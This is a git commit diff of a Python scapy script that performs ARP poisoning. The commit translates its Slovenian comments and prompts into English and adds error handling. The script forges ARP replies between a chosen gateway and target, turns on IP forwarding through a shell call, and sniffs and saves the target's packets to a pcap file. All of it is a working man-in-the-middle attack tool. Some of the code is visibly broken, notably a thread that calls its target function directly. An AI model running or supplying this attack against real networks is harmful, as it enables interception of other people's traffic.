6a9f0170a5f3307398ae38efac816250d9ed6ac4
davidv171 <david.vuckovic7@gmail.com>
2017-12-16 11:30:36 +0100

    Translated into English. Added some robustness.

--- arpPoison.py
+++ arpPoison.py
@@ -1,51 +1,66 @@
 import threading
 
+
 from scapy.all import *
-# Vpisi parametre
+# Input parameters
 from scapy.layers.l2 import ARP
 
-gateway = raw_input("Vpisi IP gateway-ja ")
-tarca = raw_input("Vpisi IP tarce ")
-#Interface na katerem bomo zagnali
-conf.iface = "wlp7s0"
-#Glede na vpisan IP naslov tarce pridobimo mac naslov z uporabo ARP requesta
-def pridobi_mac(target):
-    ans= sr1(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=target),timeout=10)
+gateway = input("Enter gateway IP ")
+target = input("Enter target IP ")
 
-    return ans[ARP].hwsrc
+#ex. :conf.iface = "wlp7s0"
+#conf.iface is the interface that does your networking, check ifconfing/ipconfig on Windows to see what it is
+conf.iface = input("Input your default interface: ")
+#Get target MAC using arp requests, IP of the target needs to be specified
 
 
-gatewayMAC = pridobi_mac(gateway)
-print(gatewayMAC)
-tarcaMAC = pridobi_mac(tarca)
-#Funkcija, ki zastruplja s pomocjo ARP
-#V bistvu posljemo ARP poizvedovanje, ki nas MAC naslov nastavi kot MAC naslov gateway-ja
-
-
-def poison(tarca, gatewayMAC, gateway, tarcaMAC):
+def get_mac(target1):
+    ans = sr1(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=target1), timeout=10)
     try:
-        send(ARP(op=2, pdst=gateway, hwdst=gatewayMAC, psrc=tarca))
-        send(ARP(op=2, pdst=tarca, hwdst=tarcaMAC, psrc=gateway))
+        return ans[ARP].hwsrc
+    except TypeError:
+        print("The response was empty, check connection or parametres!")
+    except PermissionError:
+        print("You have not set the permissions yet, are you root?")
+
+
+gatewayMAC = get_mac(gateway)
+print(gatewayMAC)
+targetMAC = get_mac(target)
+
+
+#Read readme to understand this
+#Use ctrl+c when you think it worked to stop the function from running.
+def poison(target_ip, gateway_mac, gateway_ip, target_mac):
+    try:
+        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
         time.sleep(2)
     except KeyboardInterrupt:
-        print("Konec zastruplanja!")
+        print("Ending")
 
-print("Zagon skripte")
-#Komanda s katero omogocamo forwarding IP paketov
+
+print("Script running")
+#Command that allows us to forward IP packets, could be different based on OS
 #sysctl -w net.ipv4.ip_forward=1
 os.system("sysctl -w net.ipv4.ip_forward=1")
-print("Parametri:")
-print("Gateway IP in MAC" + gateway + " " + gatewayMAC)
-print("Tarca IP in MAC" + tarca + " " + tarcaMAC)
-print("Pricetek zastrupljanja")
-poison_thread = threading.Thread(target=poison(tarca,gatewayMAC,gateway,tarcaMAC))
+try:
+    print("Parametres:")
+    print("Gateway IP & MAC" + gateway + " " + gatewayMAC)
+    print("Tarca IP & MAC" + target + " " + targetMAC)
+    print("Poisoning")
+except TypeError:
+    print("There was an empty return string!")
+poison_thread = threading.Thread(target=poison(target, gatewayMAC, gateway, targetMAC))
 poison_thread.start()
 packet_count = 20
+#Input filter ex: icmp , tcp etc.
+sniff_filter = input("Input filter")
 try:
-    print("Pricetek snifanja")
-    paketi = sniff(filter="icmp", iface=conf.iface,count = packet_count)
+    print("Sniffing")
+    paketi = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
     wrpcap("python.pcap", paketi)
-
+#CTRL+C or OS specific keyboard interrupt ends the sniffing and thus the program.
 except KeyboardInterrupt:
     sys.exit(0)
 
